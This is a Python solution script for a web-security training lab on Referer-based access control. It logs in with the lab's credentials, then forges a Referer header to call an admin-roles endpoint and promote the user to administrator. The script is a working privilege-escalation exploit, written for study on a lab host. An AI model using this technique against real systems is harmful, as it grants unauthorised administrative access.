###################################################################
#
# Lab: Referer-based access control
#
# Hack Steps: 
#      1. Login as wiener
#      2. Upgrade wiener to be an admin by adding Referer header
#
###################################################################
import requests

# Change this to your lab URL
LAB_URL = "https://0a8f001a0438926e812039dc006600b9.web-security-academy.net"

def main():
    print("⦗1⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter" }
    login_as_wiener = post_data("/login", data)
        
    print("OK")
    print("⦗2⦘ Upgrading wiener to be an admin by adding Referer header.. ", end="", flush=True)    
    
    session = login_as_wiener.cookies.get("session") 
    cookies = { "session": session }
    headers = { "Referer": f"{LAB_URL}/admin" }
    fetch("/admin-roles?username=wiener&action=upgrade", cookies=cookies, headers=headers)

    print("OK")
    print("🗹 The lab should be marked now as " + "solved")


def fetch(path, cookies, headers):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, headers=headers, allow_redirects=False)
    except:
        print("⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print("⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)

        
if __name__ == "__main__":
    main()

